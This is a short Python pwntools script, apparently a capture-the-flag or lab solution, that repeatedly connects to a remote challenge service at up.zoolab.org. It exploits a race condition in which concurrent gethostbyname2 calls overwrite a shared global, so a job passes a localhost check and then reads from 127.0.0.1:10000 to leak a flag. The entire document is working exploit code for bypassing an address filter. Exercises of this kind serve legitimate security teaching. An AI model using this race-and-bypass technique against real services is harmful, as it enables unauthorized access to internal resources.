#!/usr/bin/env python3
from pwn import *
import time

r = remote("up.zoolab.org", 10932)
r.recvuntil(b"==== Menu ====")

def send_job(addr):
    r.sendline(b"g")
    r.sendline(addr.encode())

def check_flag():
    r.sendline(b"v")
    r.recvuntil(b"Job #1:")
    line1 = r.recvline()
    r.recvuntil(b"Job #2:")
    line2 = r.recvline()

    print("[*] Job #1:", line1.decode().strip())
    print("[*] Job #2:", line2.decode().strip())

    if b"FLAG" in line1 or b"FLAG" in line2:
        return True
    return False


# make all threads busy, then there's a chance to produce race condition
for i in range(100):
    print(f"[*] Attempt {i+1}")

    # step 1: send a legal host first (but got refused)
    send_job("127.0.0.2/10000")

    # step 2: produce a job that will be refused cuz it is localhost
    """
        It'll generate a race condition, because this job also call gethostbyname2
        and gethostbyname2 will write in the same global variable,
        cover the previous job's result.
        In result, previous job will read content from 127.0.0.1/10000(cuz previous conditions are already passed)
    """
    send_job("127.0.0.1/10000")

    # sleep for a while to let the job be processed
    time.sleep(0.05)

    if check_flag():
        print("[+] Got the FLAG!")
        break

r.interactive()
